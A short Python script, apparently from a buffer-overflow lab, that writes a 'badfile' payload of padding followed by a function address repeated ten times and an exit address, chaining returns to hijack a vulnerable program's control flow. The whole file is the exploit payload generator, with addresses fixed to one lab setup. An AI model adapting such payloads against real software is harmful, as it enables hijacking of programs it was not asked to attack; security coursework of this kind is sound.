#!/usr/bin/python3

import sys 

content = bytearray(0xaa for i in range(1000))
foo_addr = 0x565562d0 
exit_addr = 0xf7e05f80
start = 116 

for i in range(0, 10):
    content[start:start + 4] = (foo_addr).to_bytes(4, byteorder='little')
    start += 4
content[start:start + 4] = (exit_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)
